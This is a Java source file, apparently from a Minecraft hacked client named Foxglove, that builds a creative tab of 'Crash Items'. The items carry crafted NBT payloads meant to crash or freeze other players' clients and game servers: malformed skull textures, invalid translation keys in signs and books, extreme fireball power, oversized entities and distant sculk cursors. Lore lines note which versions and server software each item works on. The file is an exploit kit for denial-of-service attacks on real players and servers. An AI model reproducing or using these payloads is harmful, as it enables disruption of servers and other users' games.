package me.nekosarekawaii.foxglove.creativetab.impl;

import me.nekosarekawaii.foxglove.Foxglove;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.ExploitFixerModule;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class CrashItemsCreativeTab extends CreativeTab {

    public CrashItemsCreativeTab() {
        super(new ItemStack(Items.BARRIER).setCustomName(Text.literal("Crash Items")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        final ExploitFixerModule exploitFixerModule = Foxglove.getInstance().getModuleRegistry().getExploitFixerModule();

        current.add(createItem(createCrashSkull("ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ=="),
                Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head"),
                Text.literal(Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)")
        ));
        current.add(createItem(createCrashSkull("ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIgLm1pbmVjcmFmdC5uZXQiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ=="),
                Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head V2"),
                Text.literal(Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)")
        ));
        current.add(createItem(createCrashSign("translation.test.invalid"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign")));
        current.add(createItem(createCrashSign("translation.test.invalid2"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign V2")));
        current.add(createItem(createCrashBook("translation.test.invalid"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Book")));
        current.add(createItem(createCrashBook("translation.test.invalid2"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Book V2")));
        current.add(createItem(createClientCrashExperience(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Client Crash Experience")));
        current.add(createItem(createServerCrashEntity(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Crash Entity"), Text.literal("Doesn't work on Paper Spigot Servers.")));
        current.add(createItem(createClientCrashArea(), Text.literal(Formatting.RED + "Client Crash Area")));
        current.add(createItem(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Client Freeze Entity")));
        current.add(createItem(this.createInstantCrashSculkItem(),
                Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Block"),
                Text.literal(Formatting.AQUA + Formatting.BOLD.toString() + "Works on Paper")
        ));

        if (exploitFixerModule.isEnabled() && exploitFixerModule.blockInvalidIdentifierCrash.getValue()) {
            current.add(createItem(createClientInstantCrashPot(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Instant Crash Pot")));
        }

        return current;
    }

    private ItemStack createCrashSkull(final String value) {
        final var item = new ItemStack(Items.PLAYER_HEAD);
        final var base = new NbtCompound();

        final var properties = new NbtCompound();
        final var textures = new NbtList();

        final var data = new NbtCompound();
        data.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
        data.putString("Value", value);
        textures.add(data);

        properties.put("textures", textures);

        final var skullOwner = new NbtCompound();
        skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
        skullOwner.put("Properties", properties);
        skullOwner.putString("Name", "ed0cinU");

        base.put("SkullOwner", skullOwner);
        item.setNbt(base);

        return item;
    }

    private ItemStack createCrashSign(final String component) {
        final var item = new ItemStack(Items.OAK_SIGN);
        final var base = item.getOrCreateNbt();

        final var blockEntityTag = new NbtCompound();
        blockEntityTag.put("Text1", NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
        blockEntityTag.put("Text2", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
        blockEntityTag.put("Text3", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
        blockEntityTag.put("Text4", NbtString.of(Text.Serializer.toJson(Text.literal(""))));

        base.put("BlockEntityTag", blockEntityTag);

        return item;
    }

    private ItemStack createCrashBook(final String component) {
        final var item = new ItemStack(Items.WRITTEN_BOOK);

        final var pages = new NbtList();
        pages.add(NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
        item.setSubNbt("pages", pages);

        item.setSubNbt("author", NbtString.of("Server"));
        item.setSubNbt("title", NbtString.of("Read Me!"));

        return item;
    }

    private ItemStack createClientCrashExperience() {
        final var item = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final var base = new NbtCompound();

        final var entityTag = new NbtCompound();
        entityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)));
        entityTag.putInt("Value", 1337);
        entityTag.putInt("Count", 999999);
        entityTag.putByte("CustomNameVisible", (byte) 1);
        entityTag.putByte("Glowing", (byte) 1);
        entityTag.putByte("HasVisualFire", (byte) 1);
        entityTag.putString("id", "minecraft:experience_orb");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createServerCrashEntity() {
        final var item = new ItemStack(Items.BAT_SPAWN_EGG);
        final var base = new NbtCompound();

        final var entityTag = new NbtCompound();

        final var power = new NbtList();
        power.add(NbtDouble.of(1.0E43));
        power.add(NbtDouble.of(0));
        power.add(NbtDouble.of(0));

        entityTag.put("power", power);

        entityTag.putString("id", "minecraft:small_fireball");
        base.put("EntityTag", entityTag);

        item.setNbt(base);

        return item;
    }

    private ItemStack createClientCrashArea() {
        final var item = new ItemStack(Items.SALMON_SPAWN_EGG);
        final var base = new NbtCompound();

        final var entityTag = new NbtCompound();
        entityTag.putFloat("RadiusOnUse", 100f);
        entityTag.putFloat("RadiusPerTick", 1f);
        entityTag.putInt("Duration", 60000);
        entityTag.putFloat("Radius", 100f);
        entityTag.putInt("ReapplicationDelay", 0);
        entityTag.putString("Particle", "elder_guardian");
        entityTag.putString("id", "minecraft:area_effect_cloud");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createClientInstantCrashPot() {
        final var item = new ItemStack(Items.DECORATED_POT);
        final var base = new NbtCompound();

        final var blockEntityTag = new NbtCompound();

        final var sherds = new NbtList();
        sherds.add(NbtString.of(RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase()));
        blockEntityTag.put("sherds", sherds);

        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);

        return item;
    }

    private ItemStack createSodiumClientFreezeEntity() {
        final var item = new ItemStack(Items.BAT_SPAWN_EGG);
        final var base = new NbtCompound();

        final var entityTag = new NbtCompound();
        entityTag.putFloat("width", 999999F);
        entityTag.putFloat("height", 999999F);
        entityTag.putString("id", "minecraft:interaction");

        base.put("EntityTag", entityTag);
        item.setNbt(base);

        return item;
    }

    public ItemStack createInstantCrashSculkItem() {
        final var item = new ItemStack(Items.SCULK_CATALYST);
        final var base = new NbtCompound();

        final var blockEntityTag = new NbtCompound();
        final var cursors = new NbtList();

        final var firstCursor = new NbtCompound();
        final var pos = new NbtList();
        pos.add(NbtInt.of(900000000));
        pos.add(NbtInt.of(0));
        pos.add(NbtInt.of(900000000));

        firstCursor.put("pos", pos);
        firstCursor.putInt("charge", 150);

        cursors.add(firstCursor);

        blockEntityTag.put("cursors", cursors);

        base.put("BlockEntityTag", blockEntityTag);

        item.setNbt(base);

        return item;
    }

}
